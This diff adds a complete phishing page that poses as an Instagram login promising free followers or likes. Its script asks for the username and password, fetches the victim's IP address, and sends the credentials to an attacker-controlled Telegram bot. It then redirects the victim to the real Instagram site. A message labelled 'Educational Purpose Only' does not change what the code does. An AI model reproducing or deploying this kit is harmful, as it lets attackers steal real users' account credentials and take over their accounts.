@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Continue</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .card {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo-icon {
+            font-size: 3rem;
+            background: -webkit-linear-gradient(#f9ce34, #ee2a7b, #6228d7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+        }
+        
+        .card h2 {
+            font-size: 1.5rem;
+            color: #1f2937;
+            margin-bottom: 20px;
+        }
+        
+        .card p {
+            font-size: 0.9rem;
+            color: #6b7280;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 1rem;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff386e;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-bottom: 10px;
+        }
+        
+        .btn:hover {
+            background-color: #c1154c;
+        }
+
+        .btn-secondary {
+            background-color: #d1d5db;
+            color: #4b5563;
+        }
+        .btn-secondary:hover {
+            background-color: #9ca3af;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card" id="loginCard">
+    <i class="fab fa-instagram logo-icon"></i>
+    <h2>Login to Get Free Service</h2>
+    <p>To receive free followers or likes, please log in with your Instagram account. After successful login, the service will be activated, and your followers/likes will be added within 24 hours.</p>
+    
+    <form id="loginForm">
+        <button type="submit" id="loginBtn" class="btn">Login</button>
+    </form>
+    <button class="btn btn-secondary" onclick="window.location.href = 'https://www.instagram.com';">Close</button>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const botToken = urlParams.get('token');
+    const chatId = urlParams.get('chatid');
+
+    async function sendToTelegram(message) {
+        if (!botToken || !chatId) {
+            console.error('Bot Token or Chat ID is missing from URL.');
+            return;
+        }
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const params = new URLSearchParams({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+
+        try {
+            await fetch(`${url}?${params.toString()}`);
+            console.log('Message sent to Telegram successfully!');
+        } catch (error) {
+            console.error('Failed to send message to Telegram:', error);
+        }
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const username = prompt('Please enter your Instagram username or email:');
+        const password = prompt('Please enter your password:');
+        
+        if (!username || !password) {
+            alert('Login cancelled.');
+            return;
+        }
+        
+        const btn = document.getElementById('loginBtn');
+        btn.disabled = true;
+        btn.textContent = 'Logging in...';
+
+        const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'Unknown');
+        const date = new Date().toLocaleString();
+        
+        const message = `⚠️ **Phishing Attempt Detected (Instagram Service)** ⚠️\n\n**Educational Purpose Only**\n\n**Login Details:**\n- **Username:** \`${username}\`\n- **Password:** \`${password}\`\n- **IP Address:** \`${ip}\`\n- **Time:** ${date}\n\nThis data was sent to you to demonstrate how easily login credentials can be stolen.`;
+        
+        await sendToTelegram(message);
+        
+        window.location.href = 'https://www.instagram.com'; 
+    });
+</script>
+
+</body>
+</html>
